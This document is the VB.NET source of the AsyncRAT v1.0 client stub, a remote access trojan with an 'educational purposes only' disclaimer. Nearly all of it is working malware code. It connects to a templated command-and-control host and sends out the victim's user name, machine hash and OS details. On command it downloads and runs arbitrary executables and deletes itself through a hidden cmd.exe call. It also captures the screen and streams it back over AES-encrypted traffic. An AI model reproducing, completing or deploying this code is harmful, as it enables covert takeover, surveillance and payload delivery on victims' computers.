﻿Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging

'<Assembly: AssemblyTitle("%Title%")>
'<Assembly: AssemblyDescription("%Description%")>
'%ASSEMBLY%<Assembly: AssemblyCompany("%Company%")> 
'%ASSEMBLY%<Assembly: AssemblyProduct("%Product%")> 
'%ASSEMBLY%<Assembly: AssemblyCopyright("%Copyright%")> 
'%ASSEMBLY%<Assembly: AssemblyTrademark("%Trademark%")> 
'%ASSEMBLY%<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 
'%ASSEMBLY%<Assembly: Guid("%Guid%")>

Namespace Stub

    Public Class Main

        '

        '       │ Author     : NYAN CAT
        '       │ Name       : AsyncRAT

        '       Contact Me   : https://github.com/NYAN-x-CAT

        '       This program Is distributed for educational purposes only.

        '
        Public Shared Sub Main()

            Dim T1 As New Threading.Thread(New Threading.ThreadStart(AddressOf ClientSocket.BeginConnect))
            T1.Start()

            Dim T2 As New Threading.Thread(New Threading.ThreadStart(AddressOf ClientSocket.Ping))
            T2.Start()

        End Sub

    End Class









    Public Class ClientSocket

        Public Shared isConnected As Boolean = False
        Public Shared S As Socket
        Public Shared BufferLength As Long = Nothing
        Public Shared Buffer() As Byte
        Public Shared MS As New MemoryStream
        Public Shared ReadOnly SPL = Settings.SPL

        Public Shared Sub BeginConnect()

            Try
                Threading.Thread.Sleep(2500)
                S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

                Dim ipAddress As IPAddress = ipAddress.Parse(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)))
                Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))

                BufferLength = -1
                Buffer = New Byte(0) {}
                MS = New MemoryStream

                S.ReceiveBufferSize = 1024 * 500
                S.SendBufferSize = 1024 * 500

                S.Connect(ipEndPoint)

                isConnected = True
                Send(Info)

                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)

            Catch ex As Exception
                isDisconnected()
            End Try
        End Sub

        Private Shared Function Info()

            Dim OS As New Devices.ComputerInfo
            Return String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "AsyncRAT v1.0")

        End Function

        Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
            If isConnected = False Then isDisconnected()
            Try
                Dim Received As Integer = S.EndReceive(ar)
                If Received > 0 Then
                    If BufferLength = -1 Then
                        If Buffer(0) = 0 Then
                            BufferLength = BS(MS.ToArray)
                            MS.Dispose()
                            MS = New MemoryStream

                            If BufferLength = 0 Then
                                BufferLength = -1
                                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
                                Exit Sub
                            End If
                            Buffer = New Byte(BufferLength - 1) {}
                        Else
                            MS.WriteByte(Buffer(0))
                        End If
                    Else
                        MS.Write(Buffer, 0, Received)
                        If (MS.Length = BufferLength) Then
                            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf BeginRead), MS.ToArray)
                            BufferLength = -1
                            MS.Dispose()
                            MS = New MemoryStream
                            Buffer = New Byte(0) {}
                        Else
                            Buffer = New Byte(BufferLength - MS.Length - 1) {}
                        End If
                    End If
                Else
                    isDisconnected()
                    Exit Sub
                End If
                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
            Catch ex As Exception
                isDisconnected()
                Exit Sub
            End Try
        End Sub

        Public Shared Sub BeginRead(ByVal b As Byte())
            Try
                Messages.Read(b)
            Catch ex As Exception
            End Try
        End Sub

        Public Shared Sub Send(ByVal msg As String)
            Try
                Using MS As New MemoryStream
                    Dim B As Byte() = AES_Encryptor(SB(msg))
                    Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                    MS.Write(L, 0, L.Length)
                    MS.Write(B, 0, B.Length)

                    S.Poll(-1, SelectMode.SelectWrite)
                    S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
                End Using
            Catch ex As Exception
                isDisconnected()
            End Try
        End Sub

        Private Shared Sub EndSend(ByVal ar As IAsyncResult)
            Try
                S.EndSend(ar)
            Catch ex As Exception
            End Try
        End Sub

        Public Shared Sub isDisconnected()
            isConnected = False

            Try
                S.Close()
                S.Dispose()
            Catch ex As Exception
            End Try

            Try
                MS.Close()
                MS.Dispose()
            Catch ex As Exception
            End Try

            BeginConnect()

        End Sub

        Public Shared Sub Ping()
            While True
                Threading.Thread.Sleep(30 * 1000)
                Try
                    If S.Connected Then
                        Using MS As New MemoryStream
                            Dim B As Byte() = AES_Encryptor(SB("PING?"))
                            Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                            MS.Write(L, 0, L.Length)
                            MS.Write(B, 0, B.Length)

                            S.Poll(-1, SelectMode.SelectWrite)
                            S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
                        End Using
                    End If
                Catch ex As Exception
                    isConnected = False
                End Try
            End While
        End Sub


    End Class











    Public Class Settings
        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({123456})
        Public Shared ReadOnly SPL As String = "<NYANxCAT>"
        Public Shared ReadOnly KEY As String = "<1234>"
    End Class












    Public Class Messages
        Private Shared ReadOnly SPL = ClientSocket.SPL

        Public Shared Sub Read(ByVal b As Byte())
            Try
                Dim A As String() = Split(BS(AES_Decryptor(b)), SPL)
                Select Case A(0)

                    Case "CLOSE"
                        Try
                            ClientSocket.S.Shutdown(Net.Sockets.SocketShutdown.Both)
                            ClientSocket.S.Close()
                        Catch ex As Exception
                        End Try

                        Environment.Exit(0)

                    Case "DW"
                        Download(A(1), A(2))

                    Case "UPDATE"
                        Update(A(1))

                    Case "RD-"
                        ClientSocket.Send("RD-")

                    Case "RD+"
                        RemoteDesktop.Capture(A(1), A(2))

                End Select
            Catch ex As Exception
            End Try
        End Sub

        Private Shared Sub Download(ByVal Name As String, ByVal Data As String)
            Try
                Dim NewFile = Path.GetTempFileName + Name
                File.WriteAllBytes(NewFile, Convert.FromBase64String(Data))
                Threading.Thread.Sleep(500)
                Diagnostics.Process.Start(NewFile)
            Catch ex As Exception
            End Try
        End Sub

        Private Shared Sub Update(ByVal Data As String)
            Try
                Dim Temp As String = Path.GetTempFileName + ".exe"
                File.WriteAllBytes(Temp, Convert.FromBase64String(Data))
                Threading.Thread.Sleep(500)
                Diagnostics.Process.Start(Temp)

                Dim Del As New Diagnostics.ProcessStartInfo With {
                .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
                .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden,
                .CreateNoWindow = True,
                .FileName = "cmd.exe"
            }

                Try
                    ClientSocket.S.Shutdown(Net.Sockets.SocketShutdown.Both)
                    ClientSocket.S.Close()
                Catch ex As Exception
                End Try

                Diagnostics.Process.Start(Del)
                Environment.Exit(0)
            Catch ex As Exception
            End Try
        End Sub


    End Class










    Module Helper

        Function SB(ByVal s As String) As Byte()
            Return System.Text.Encoding.Default.GetBytes(s)
        End Function

        Function BS(ByVal b As Byte()) As String
            Return System.Text.Encoding.Default.GetString(b)
        End Function

        Function ID() As String
            Dim S As String = Nothing

            S += Environment.UserDomainName
            S += Environment.UserName
            S += Environment.MachineName

            Return S
        End Function

        Function GetHash(strToHash As String) As String
            Dim md5Obj As New MD5CryptoServiceProvider
            Dim bytesToHash() As Byte = SB(strToHash)
            bytesToHash = md5Obj.ComputeHash(bytesToHash)
            Dim strResult As New System.Text.StringBuilder
            For Each b As Byte In bytesToHash
                strResult.Append(b.ToString("x2"))
            Next
            Return strResult.ToString.Substring(0, 12).ToUpper
        End Function

        Function AES_Encryptor(ByVal input As Byte()) As Byte()
            Dim AES_ As New RijndaelManaged
            Dim Hash As New MD5CryptoServiceProvider
            Try
                AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES_.Mode = CipherMode.ECB
                Dim DESEncrypter As ICryptoTransform = AES_.CreateEncryptor
                Dim Buffer As Byte() = input
                Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
            End Try
        End Function

        Function AES_Decryptor(ByVal input As Byte()) As Byte()
            Dim AES_ As New RijndaelManaged
            Dim Hash As New MD5CryptoServiceProvider
            Try
                AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES_.Mode = CipherMode.ECB
                Dim DESDecrypter As ICryptoTransform = AES_.CreateDecryptor
                Dim Buffer As Byte() = input
                Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
            End Try
        End Function
    End Module










    '       │ Author     : NYAN CAT
    '       │ Name       : Simple remote desktop. "capture,resize,compress,send"

    '       Contact Me   : https://github.com/NYAN-x-CAT

    '       This program Is distributed for educational purposes only.

    Public Class RemoteDesktop

        Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)
            Try
                Dim B As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                Dim g As Graphics = Graphics.FromImage(B)
                g.CompositingQuality = CompositingQuality.HighSpeed
                g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)

                Dim Resize As New Bitmap(W, H)
                Dim g2 As Graphics = Graphics.FromImage(Resize)
                g2.CompositingQuality = CompositingQuality.HighSpeed
                g2.DrawImage(B, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)

                Dim encoderParameter As EncoderParameter = New EncoderParameter(Encoder.Quality, 40)
                Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
                Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
                encoderParameters.Param(0) = encoderParameter

                Dim MS As New IO.MemoryStream
                Resize.Save(MS, encoderInfo, encoderParameters)

                Try
                    SyncLock ClientSocket.S
                        Using MEM As New IO.MemoryStream
                            Dim Bb As Byte() = AES_Encryptor(SB(("RD+" + ClientSocket.SPL + BS(MS.ToArray))))
                            Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))

                            MEM.Write(L, 0, L.Length)
                            MEM.Write(Bb, 0, Bb.Length)

                            ClientSocket.S.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
                            ClientSocket.S.Send(MEM.ToArray, 0, MEM.Length, Net.Sockets.SocketFlags.None)
                        End Using
                    End SyncLock
                Catch ex As Exception
                    ClientSocket.isConnected = False
                End Try

                Try
                    g.Dispose()
                    g2.Dispose()
                    B.Dispose()
                    MS.Dispose()
                Catch ex As Exception
                End Try

            Catch ex As Exception
            End Try

        End Sub

        Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
            Try
                Dim j As Integer
                Dim encoders() As ImageCodecInfo
                encoders = ImageCodecInfo.GetImageEncoders()

                j = 0
                While j < encoders.Length
                    If encoders(j).FormatID = format.Guid Then
                        Return encoders(j)
                    End If
                    j += 1
                End While
                Return Nothing
            Catch ex As Exception
            End Try
        End Function
    End Class

End Namespace
